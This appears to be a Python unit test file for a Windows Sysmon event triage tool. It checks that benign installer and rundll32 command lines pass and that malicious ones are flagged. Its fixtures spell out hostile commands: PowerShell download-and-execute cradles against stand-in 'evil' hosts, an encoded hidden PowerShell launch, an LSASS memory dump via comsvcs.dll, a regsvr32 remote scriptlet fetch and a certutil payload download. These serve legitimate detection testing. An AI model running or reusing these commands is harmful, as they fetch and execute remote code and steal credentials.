from pathlib import Path
import sys
import unittest

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from agent import GeminiTriageAgent  # noqa: E402
import allowlist  # noqa: E402
import config  # noqa: E402
from event_reader import NormalizedEvent, screen_event  # noqa: E402
import keyword_matcher  # noqa: E402


def _make_proc_event(
    command_line: str,
    image: str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    parent_command_line: str = r"C:\Windows\explorer.exe",
    parent_image: str = r"C:\Windows\explorer.exe",
) -> NormalizedEvent:
    return NormalizedEvent(
        channel=config.SYSMON_CHANNEL,
        event_id=1,
        event_record_id=99999,
        utc_time="2026-11-19 04:00:00.000",
        process_id=4321,
        image=image,
        command_line=command_line,
        parent_process_id=100,
        parent_image=parent_image,
        parent_command_line=parent_command_line,
        destination_ip="",
        destination_port=None,
    )


class TestKeywordMatcherPrecision(unittest.TestCase):
    def test_false_positives_suppressed(self) -> None:
        benign_cases = [
            (r"C:\WINDOWS\system32\msiexec.exe /V", r"C:\Windows\System32\msiexec.exe"),
            (
                r"C:\Windows\syswow64\MsiExec.exe -Embedding 4DC51981F3AEBFD2B33E8D1B90472CB8 E Global\MSI0000",
                r"C:\Windows\SysWOW64\msiexec.exe",
            ),
            (
                r'"C:\Program Files\Internet Explorer\iexplore.exe" --encoding=utf-8 --proxy-bypass-list=<-loopback> --window-state=hidden 0x12iex34',
                r"C:\Program Files\Internet Explorer\iexplore.exe",
            ),
            (
                r"C:\WINDOWS\system32\rundll32.exe C:\WINDOWS\system32\AppXDeploymentExtensions.OneCore.dll,ShellRefresh",
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r'"C:\WINDOWS\system32\rundll32.exe" C:\WINDOWS\system32\PcaSvc.dll,PcaPatchSdbTask',
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r'"C:\WINDOWS\system32\rundll32.exe" sysdm.cpl,EditEnvironmentVariables',
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r"C:\WINDOWS\system32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding",
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r'"C:\WINDOWS\system32\rundll32.exe" /d acproxy.dll,PerformAutochkOperations',
                r"C:\Windows\System32\rundll32.exe",
            ),
            (
                r"C:\Windows\System32\regsvr32.exe /s C:\Windows\System32\ole32.dll",
                r"C:\Windows\System32\regsvr32.exe",
            ),
        ]
        for cmd, img in benign_cases:
            with self.subTest(cmd=cmd):
                ev = _make_proc_event(cmd, image=img)
                flagged, reasons = screen_event(ev)
                self.assertFalse(flagged, f"誤検知発生: reasons={reasons}")
                self.assertEqual(GeminiTriageAgent.classify_offline_severity(ev), config.SEVERITY_SUSPICIOUS)

    def test_benign_msiexec_parent_does_not_flag_child(self) -> None:
        ev = _make_proc_event(
            command_line=r'"C:\Program Files\Adobe\Acrobat DC\Acrobat\AdobeCollabSync.exe"',
            image=r"C:\Program Files\Adobe\Acrobat DC\Acrobat\AdobeCollabSync.exe",
            parent_command_line=r"C:\Windows\System32\MsiExec.exe -Embedding C831159292D3A6BDF73196BBF146FE3E",
            parent_image=r"C:\Windows\System32\msiexec.exe",
        )
        flagged, reasons = screen_event(ev)
        self.assertFalse(flagged, f"親msiexec誤検知: {reasons}")

    def test_true_positives_still_detected(self) -> None:
        malicious_cases = [
            (
                r'powershell.exe -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil/a.ps1\')"',
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                {"iex", "downloadstring"},
                True,
            ),
            (
                r'pwsh.exe -Command "irm https://example.com/a.ps1 | iex"',
                r"C:\Program Files\PowerShell\7\pwsh.exe",
                {"iex"},
                True,
            ),
            (
                r"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACkA",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                {"hidden", "bypass", "-enc"},
                True,
            ),
            (
                r"C:\Windows\System32\rundll32.exe C:\Users\Public\evil.dll,Run",
                r"C:\Windows\System32\rundll32.exe",
                {"rundll32"},
                False,
            ),
            (
                r"C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 600 C:\temp\lsass.dmp full",
                r"C:\Windows\System32\rundll32.exe",
                {"rundll32"},
                False,
            ),
            (
                r"C:\Windows\System32\regsvr32.exe /s /n /u /i:http://evil.example/s.sct scrobj.dll",
                r"C:\Windows\System32\regsvr32.exe",
                {"regsvr32"},
                False,
            ),
            (
                r"certutil.exe -f -urlcache -split http://evil.example/payload.exe C:\temp\a.exe",
                r"C:\Windows\System32\certutil.exe",
                {"certutil -urlcache"},
                True,
            ),
        ]
        for cmd, img, expected_kws, expected_high_risk in malicious_cases:
            with self.subTest(cmd=cmd):
                matched = set(keyword_matcher.find_suspicious_keywords(cmd, image=img))
                self.assertTrue(expected_kws.issubset(matched))
                ev = _make_proc_event(cmd, image=img)
                flagged, _ = screen_event(ev)
                self.assertTrue(flagged)
                if expected_high_risk:
                    self.assertEqual(GeminiTriageAgent.classify_offline_severity(ev), config.SEVERITY_CRITICAL)

    def test_never_allowlist_word_boundary(self) -> None:
        self.assertTrue(keyword_matcher.has_never_allowlist_keyword("wevtutil cl Security"))
        self.assertFalse(keyword_matcher.has_never_allowlist_keyword("my_custom_wevtutil_backup"))
        ev_benign = _make_proc_event("my_fltmc_helper.exe", image=r"C:\Tools\my_fltmc_helper.exe")
        self.assertFalse(allowlist.is_high_risk_protected_event(ev_benign))


if __name__ == "__main__":
    unittest.main(verbosity=2)
